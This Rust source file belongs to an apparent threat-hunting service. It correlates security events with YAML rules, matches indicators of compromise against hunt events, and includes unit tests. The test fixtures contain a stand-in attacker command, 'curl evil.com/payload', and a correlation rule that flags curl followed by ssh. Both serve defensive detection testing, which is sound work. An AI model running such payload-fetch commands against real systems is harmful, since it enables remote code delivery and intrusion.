use chrono::{DateTime, Utc};
use hunt_query::service::HuntEvent;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::detection::severity_label;
use crate::engine::{Alert, CorrelationEngine};
use crate::error::{Error, Result};
use crate::ioc::detect_ioc_type;
use crate::ioc::{IocDatabase, IocEntry};
use crate::rules::CorrelationRule;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CorrelateRequest {
    pub rules: Vec<CorrelationRule>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub query: Option<hunt_query::service::HuntQueryRequest>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub output_mode: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CorrelationFinding {
    pub rule_name: String,
    pub title: String,
    pub severity: String,
    pub triggered_at: DateTime<Utc>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence_event_ids: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence: Vec<Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct IocMatchRequest {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub indicators: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stix_bundle: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub query: Option<hunt_query::service::HuntQueryRequest>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct IocEventMatch {
    pub event_id: String,
    pub summary: String,
    pub match_field: String,
    pub matched_iocs: Vec<IocEntry>,
}

pub fn correlate_hunt_events(
    rules: Vec<CorrelationRule>,
    events: &[HuntEvent],
) -> Result<Vec<CorrelationFinding>> {
    let timeline_events = events
        .iter()
        .map(HuntEvent::to_timeline_event)
        .collect::<Vec<_>>();
    let mut engine = CorrelationEngine::new(rules)?;
    let mut alerts = Vec::new();

    for event in &timeline_events {
        alerts.extend(engine.process_event(event));
    }
    alerts.extend(engine.flush());

    Ok(alerts.into_iter().map(map_alert).collect())
}

fn map_alert(alert: Alert) -> CorrelationFinding {
    CorrelationFinding {
        rule_name: alert.rule_name,
        title: alert.title,
        severity: severity_label(alert.severity).to_string(),
        triggered_at: alert.triggered_at,
        evidence_event_ids: alert
            .evidence
            .iter()
            .filter_map(|event| event.event_id.clone())
            .collect(),
        evidence: alert
            .evidence
            .iter()
            .map(|event| serde_json::to_value(event).unwrap_or(Value::Null))
            .collect(),
    }
}

pub fn build_ioc_database(request: &IocMatchRequest) -> Result<IocDatabase> {
    let mut db = IocDatabase::new();
    for indicator in &request.indicators {
        let ioc_type = detect_ioc_type(indicator)
            .ok_or_else(|| Error::IocParse(format!("unsupported indicator: {indicator}")))?;
        db.add_entry(IocEntry {
            indicator: indicator.clone(),
            ioc_type,
            description: None,
            source: None,
        });
    }
    if let Some(bundle) = &request.stix_bundle {
        db.merge(IocDatabase::load_stix_bundle_value(bundle)?);
    }
    Ok(db)
}

pub fn match_hunt_events(db: &IocDatabase, events: &[HuntEvent]) -> Vec<IocEventMatch> {
    events
        .iter()
        .flat_map(|event| {
            let timeline_event = event.to_timeline_event();
            crate::ioc::match_event(db, &timeline_event)
                .into_iter()
                .map(|matched| IocEventMatch {
                    event_id: event.event_id.clone(),
                    summary: event.summary.clone(),
                    match_field: matched.match_field,
                    matched_iocs: matched.matched_iocs,
                })
                .collect::<Vec<_>>()
                .into_iter()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use chrono::TimeZone;
    use hunt_query::service::{HuntEvent, HuntEventKind, HuntEventSource};
    use hunt_query::timeline::NormalizedVerdict;
    use uuid::Uuid;

    use super::*;

    fn make_event(event_id: &str, summary: &str, process: Option<&str>) -> HuntEvent {
        HuntEvent {
            event_id: event_id.to_string(),
            tenant_id: Uuid::nil(),
            source: HuntEventSource::Tetragon,
            kind: HuntEventKind::ProcessExec,
            timestamp: Utc.with_ymd_and_hms(2025, 3, 6, 12, 0, 0).unwrap(),
            verdict: NormalizedVerdict::Allow,
            severity: Some("low".to_string()),
            summary: summary.to_string(),
            action_type: Some("process".to_string()),
            process: process.map(ToOwned::to_owned),
            namespace: Some("default".to_string()),
            pod: Some("agent-pod".to_string()),
            session_id: Some("session-1".to_string()),
            endpoint_agent_id: None,
            runtime_agent_id: None,
            principal_id: None,
            grant_id: None,
            response_action_id: None,
            detection_ids: vec![],
            target_kind: None,
            target_id: None,
            target_name: None,
            envelope_hash: None,
            issuer: None,
            schema_name: None,
            signature_valid: Some(true),
            raw_ref: format!("hunt-envelope:{event_id}"),
            attributes: serde_json::json!({"summary": summary}),
        }
    }

    #[test]
    fn correlate_hunt_events_preserves_evidence_ids() {
        let rule_yaml = r#"
schema: clawdstrike.hunt.correlation.v1
name: curl_then_ssh
severity: high
description: suspicious sequence
window: 10m
conditions:
  - bind: curl
    source: tetragon
    action_type: process
    target_pattern: curl
  - bind: ssh
    source: tetragon
    action_type: process
    target_pattern: ssh
    after: curl
    within: 5m
output:
  title: curl followed by ssh
  evidence: [curl, ssh]
"#;
        let rule = crate::rules::parse_rule(rule_yaml).expect("parse rule");
        let findings = correlate_hunt_events(
            vec![rule],
            &[
                make_event("evt-1", "process_exec /usr/bin/curl", Some("/usr/bin/curl")),
                make_event("evt-2", "process_exec /usr/bin/ssh", Some("/usr/bin/ssh")),
            ],
        )
        .expect("correlate events");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].evidence_event_ids, vec!["evt-1", "evt-2"]);
    }

    #[test]
    fn build_and_match_ioc_database_for_hunt_events() {
        let request = IocMatchRequest {
            indicators: vec!["evil.com".to_string()],
            stix_bundle: None,
            query: None,
        };
        let db = build_ioc_database(&request).expect("build IOC db");
        let matches = match_hunt_events(
            &db,
            &[make_event(
                "evt-3",
                "process_exec curl evil.com/payload",
                Some("/usr/bin/curl"),
            )],
        );

        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].event_id, "evt-3");
        assert_eq!(matches[0].matched_iocs[0].indicator, "evil.com");
    }

    #[test]
    fn match_hunt_events_preserves_multiple_indicator_matches() {
        let request = IocMatchRequest {
            indicators: vec!["evil.com".to_string(), "10.0.0.9".to_string()],
            stix_bundle: None,
            query: None,
        };
        let db = build_ioc_database(&request).expect("build IOC db");
        let matches = match_hunt_events(
            &db,
            &[make_event(
                "evt-1",
                "process_exec curl evil.com/payload",
                Some("connect 10.0.0.9"),
            )],
        );

        assert_eq!(matches.len(), 2);
        assert_eq!(matches[0].event_id, "evt-1");
        assert_eq!(matches[0].match_field, "summary");
        assert_eq!(matches[0].matched_iocs[0].indicator, "evil.com");
        assert_eq!(matches[1].event_id, "evt-1");
        assert_eq!(matches[1].match_field, "process");
        assert_eq!(matches[1].matched_iocs[0].indicator, "10.0.0.9");
    }

    #[test]
    fn control_plane_events_participate_in_ioc_matching() {
        let request = IocMatchRequest {
            indicators: vec!["evil.com".to_string()],
            stix_bundle: None,
            query: None,
        };
        let db = build_ioc_database(&request).expect("build IOC db");
        let event = HuntEvent {
            event_id: "evt-response".to_string(),
            tenant_id: Uuid::nil(),
            source: HuntEventSource::Response,
            kind: HuntEventKind::ResponseActionCreated,
            timestamp: Utc.with_ymd_and_hms(2025, 3, 6, 12, 0, 0).unwrap(),
            verdict: NormalizedVerdict::Warn,
            severity: Some("medium".to_string()),
            summary: "response action created for evil.com containment".to_string(),
            action_type: Some("transition_posture".to_string()),
            process: None,
            namespace: None,
            pod: None,
            session_id: None,
            endpoint_agent_id: None,
            runtime_agent_id: None,
            principal_id: Some("principal-1".to_string()),
            grant_id: None,
            response_action_id: Some("action-1".to_string()),
            detection_ids: Vec::new(),
            target_kind: Some("principal".to_string()),
            target_id: Some("principal-1".to_string()),
            target_name: Some("agent".to_string()),
            envelope_hash: None,
            issuer: None,
            schema_name: None,
            signature_valid: Some(true),
            raw_ref: "hunt-envelope:evt-response".to_string(),
            attributes: serde_json::json!({"operation": "containment", "indicator": "evil.com"}),
        };

        let matches = match_hunt_events(&db, &[event]);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].event_id, "evt-response");
    }

    #[test]
    fn control_plane_events_participate_in_correlation() {
        let rule_yaml = r#"
schema: clawdstrike.hunt.correlation.v1
name: response_then_detection
severity: medium
description: control plane sequence
window: 10m
conditions:
  - source: response
    target_pattern: containment
    bind: response
  - source: detection
    target_pattern: containment
    after: response
    within: 5m
    bind: detection
output:
  title: containment escalated
  evidence: [response, detection]
"#;
        let rule = crate::rules::parse_rule(rule_yaml).expect("parse rule");
        let response_event = HuntEvent {
            event_id: "evt-response".to_string(),
            tenant_id: Uuid::nil(),
            source: HuntEventSource::Response,
            kind: HuntEventKind::ResponseActionCreated,
            timestamp: Utc.with_ymd_and_hms(2025, 3, 6, 12, 0, 0).unwrap(),
            verdict: NormalizedVerdict::Warn,
            severity: Some("medium".to_string()),
            summary: "response action created for containment".to_string(),
            action_type: Some("transition_posture".to_string()),
            process: None,
            namespace: None,
            pod: None,
            session_id: None,
            endpoint_agent_id: None,
            runtime_agent_id: None,
            principal_id: Some("principal-1".to_string()),
            grant_id: None,
            response_action_id: Some("action-1".to_string()),
            detection_ids: Vec::new(),
            target_kind: Some("principal".to_string()),
            target_id: Some("principal-1".to_string()),
            target_name: Some("agent".to_string()),
            envelope_hash: None,
            issuer: None,
            schema_name: None,
            signature_valid: Some(true),
            raw_ref: "hunt-envelope:evt-response".to_string(),
            attributes: serde_json::json!({"operation": "containment"}),
        };
        let detection_event = HuntEvent {
            event_id: "evt-detection".to_string(),
            source: HuntEventSource::Detection,
            kind: HuntEventKind::DetectionFired,
            timestamp: Utc.with_ymd_and_hms(2025, 3, 6, 12, 1, 0).unwrap(),
            summary: "detection fired after containment".to_string(),
            action_type: Some("containment".to_string()),
            response_action_id: Some("action-1".to_string()),
            severity: Some("high".to_string()),
            raw_ref: "hunt-envelope:evt-detection".to_string(),
            attributes: serde_json::json!({"finding": "containment escalation"}),
            ..response_event.clone()
        };

        let findings =
            correlate_hunt_events(vec![rule], &[response_event, detection_event]).expect("run");
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].evidence_event_ids,
            vec!["evt-response", "evt-detection"]
        );
    }

    #[test]
    fn ioc_match_request_defaults_missing_indicators() {
        let request: IocMatchRequest = serde_json::from_value(serde_json::json!({
            "query": {
                "limit": 25
            }
        }))
        .expect("deserialize IOC request without indicators");

        assert!(request.indicators.is_empty());
        assert!(request.stix_bundle.is_none());
        assert_eq!(request.query.and_then(|query| query.limit), Some(25));
    }
}
